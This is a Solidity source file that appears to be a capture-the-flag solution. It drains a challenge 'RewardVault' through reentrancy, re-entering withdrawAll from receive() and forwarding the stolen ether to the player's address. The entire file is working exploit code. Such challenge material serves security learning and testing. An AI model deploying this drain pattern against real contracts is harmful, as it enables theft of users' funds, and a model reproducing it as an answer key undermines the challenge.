// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./Challenge.sol";

contract Solution {
    RewardVault private vault;
    address private player;
    uint256 private depositAmount;

    function solve(Setup setup) external payable {
        player = msg.sender;
        vault = setup.vault();
        depositAmount = msg.value;

        // Create a balance entry for THIS contract (vault uses msg.sender).
        vault.deposit{value: depositAmount}();

        // Start draining; recursion continues in receive().
        vault.withdrawAll();

        // Forward everything to the player EOA.
        (bool ok,) = payable(player).call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {
        // Only react to payouts coming from the vault.
        if (msg.sender != address(vault)) return;

        // Ignore the reward payout (0.25 ether), otherwise we reenter at the wrong time.
        if (msg.value != depositAmount) return;

        // Stop before the vault cannot pay the next withdrawal amount (otherwise "send failed").
        if (address(vault).balance >= depositAmount) {
            vault.withdrawAll();
        }
    }
}